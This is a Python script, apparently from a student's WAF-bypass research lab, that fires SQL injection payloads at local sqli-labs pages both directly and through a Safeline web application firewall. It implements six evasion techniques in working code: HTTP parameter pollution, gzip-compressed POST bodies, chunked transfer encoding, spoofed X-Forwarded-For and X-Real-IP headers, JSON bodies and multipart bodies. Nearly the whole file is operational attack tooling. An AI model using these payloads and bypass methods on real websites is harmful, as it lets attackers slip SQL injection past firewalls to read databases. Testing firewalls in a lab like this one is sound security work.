"""
bypass_lab/test_http.py
========================
HTTP-layer bypass techniques — exploit how Safeline parses HTTP,
not SQL. Most promising against ML-based WAFs.

Techniques:
  1. HTTP Parameter Pollution — WAF checks first param, PHP uses last
  2. Content-Encoding: gzip — Safeline can't inspect compressed body
  3. Transfer-Encoding: chunked — split payload across chunks
  4. Content-Type manipulation — multipart, JSON, XML bodies
  5. HTTP verb tampering — different methods
  6. Header injection — X-Forwarded-For, X-Real-IP tricks
"""
import sys, gzip, io, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from bypass_lab.verify import check, run_suite, PLAIN, WAF, session
import requests

SQLI_UNION = "-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -"
LESS11     = "http://localhost:8888/Less-11/"
LESS11_P   = "http://localhost:8081/Less-11/"


# ---------------------------------------------------------------------------
# 1. HTTP Parameter Pollution
# ---------------------------------------------------------------------------
def test_hpp():
    """PHP $_GET['id'] takes LAST value; WAF might check FIRST."""
    cases = [
        # safe first, malicious second
        ("hpp: safe+sqli (last wins)",
         {"params": {"id": ["1", SQLI_UNION]}}),
        # malicious first, safe second
        ("hpp: sqli+safe (first wins on WAF?)",
         {"params": {"id": [SQLI_UNION, "1"]}}),
        # inject via different param name
        ("hpp: id2 param",
         {"params": {"id": "1", "id2": SQLI_UNION}}),
    ]

    print("\n--- HTTP Parameter Pollution ---")
    for label, kwargs in cases:
        ps, pb, pt = check(PLAIN, label=label, **kwargs)
        ws, wb, wt = check(WAF,   label=label, **kwargs)
        print(f"  {label}")
        print(f"    plain={pt}  WAF={wt}")


# ---------------------------------------------------------------------------
# 2. Content-Encoding: gzip (POST body — GitHub Issue #1222)
# ---------------------------------------------------------------------------
def test_gzip():
    """Safeline can't decompress request body (RFC 9110 non-compliance)."""
    print("\n--- Content-Encoding: gzip ---")

    # Check if Less-11 exists
    try:
        r = session.get("http://localhost:8081/Less-11/", timeout=5)
        has_less11 = r.status_code == 200 and "Less-11" in r.text
    except:
        has_less11 = False
    print(f"  Less-11 available: {has_less11}")

    payloads = [
        "admin' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",
        "admin' OR '1'='1",
    ]
    for p in payloads:
        body = f"uname={p}&passwd=x&submit=Submit"
        compressed = gzip.compress(body.encode())

        for url, label in [(LESS11_P, "plain"), (LESS11, "WAF")]:
            try:
                r = session.post(url,
                    data=compressed,
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Content-Encoding": "gzip",
                    },
                    timeout=10)
                has_data = "SEQSQLI_START" in r.text
                print(f"  gzip POST [{label}]: {r.status_code} | data={has_data}")
            except Exception as e:
                print(f"  gzip POST [{label}]: ERR {e}")
            time.sleep(0.3)


# ---------------------------------------------------------------------------
# 3. Transfer-Encoding: chunked — split payload across chunks
# ---------------------------------------------------------------------------
def test_chunked():
    """Some WAFs don't reassemble chunked bodies before inspection."""
    print("\n--- Transfer-Encoding: chunked ---")
    payload = SQLI_UNION

    def chunked_encode(s, chunk_size=5):
        data = s.encode()
        result = b""
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            result += f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n"
        result += b"0\r\n\r\n"
        return result

    body = f"id={payload}"
    chunked_body = chunked_encode(body, chunk_size=8)

    for url, label in [(PLAIN, "plain"), (WAF, "WAF")]:
        try:
            r = session.post(url.replace("Less-1/", "Less-11/"),
                data=chunked_body,
                headers={
                    "Transfer-Encoding": "chunked",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                timeout=10)
            print(f"  chunked POST [{label}]: {r.status_code}")
        except Exception as e:
            print(f"  chunked POST [{label}]: ERR {e}")
        time.sleep(0.3)


# ---------------------------------------------------------------------------
# 4. X-Forwarded-For / IP-based bypass
# ---------------------------------------------------------------------------
def test_xff():
    """Some WAFs skip inspection for internal IP ranges."""
    cases = [
        ("xff: 127.0.0.1",   {"X-Forwarded-For": "127.0.0.1"}),
        ("xff: 10.0.0.1",    {"X-Forwarded-For": "10.0.0.1"}),
        ("xff: ::1",         {"X-Forwarded-For": "::1"}),
        ("x-real-ip: local", {"X-Real-IP": "127.0.0.1"}),
    ]
    print("\n--- X-Forwarded-For / IP Header ---")
    for label, extra_headers in cases:
        ws, wb, wt = check(WAF, payload=SQLI_UNION,
                           headers={**session.headers, **extra_headers})
        print(f"  {label}: WAF={wt}")


# ---------------------------------------------------------------------------
# 5. Content-Type: application/json body
# ---------------------------------------------------------------------------
def test_json_body():
    """WAFs may parse SQL differently when payload is in JSON body."""
    import json
    print("\n--- JSON body POST ---")
    payloads = {
        "json union": f'{{"id": "{SQLI_UNION}"}}',
        "json sqli":  '{"id": "-1 UNION SELECT 1,2,3-- -"}',
    }
    for label, body in payloads.items():
        for url, tag in [(LESS11_P, "plain"), (LESS11, "WAF")]:
            try:
                r = session.post(url,
                    data=body,
                    headers={"Content-Type": "application/json"},
                    timeout=10)
                print(f"  {label} [{tag}]: {r.status_code}")
            except Exception as e:
                print(f"  {label} [{tag}]: ERR {e}")
            time.sleep(0.3)


# ---------------------------------------------------------------------------
# 6. Multipart form-data
# ---------------------------------------------------------------------------
def test_multipart():
    """WAF may not parse multipart SQL injection correctly."""
    print("\n--- Multipart form-data ---")
    from requests_toolbelt import MultipartEncoder
    try:
        from requests_toolbelt import MultipartEncoder
        m = MultipartEncoder(fields={"id": SQLI_UNION})
        r_plain = session.post(PLAIN.replace("Less-1/","Less-11/"),
                               data=m, headers={"Content-Type": m.content_type})
        print(f"  multipart [plain]: {r_plain.status_code}")
        m2 = MultipartEncoder(fields={"id": SQLI_UNION})
        r_waf = session.post(WAF.replace("Less-1/","Less-11/"),
                             data=m2, headers={"Content-Type": m2.content_type})
        print(f"  multipart [WAF]:   {r_waf.status_code}")
    except ImportError:
        # Fallback: manual multipart
        boundary = "----TestBoundary1337"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="id"\r\n\r\n'
            f"{SQLI_UNION}\r\n"
            f"--{boundary}--\r\n"
        )
        for url, tag in [(PLAIN, "plain"), (WAF, "WAF")]:
            try:
                r = session.post(url,
                    data=body.encode(),
                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                    timeout=10)
                print(f"  multipart [{tag}]: {r.status_code}")
            except Exception as e:
                print(f"  multipart [{tag}]: ERR {e}")
            time.sleep(0.3)


if __name__ == "__main__":
    print("=" * 60)
    print(" HTTP-Layer Bypass Tests")
    print("=" * 60)
    test_hpp()
    test_gzip()
    test_chunked()
    test_xff()
    test_json_body()
    test_multipart()
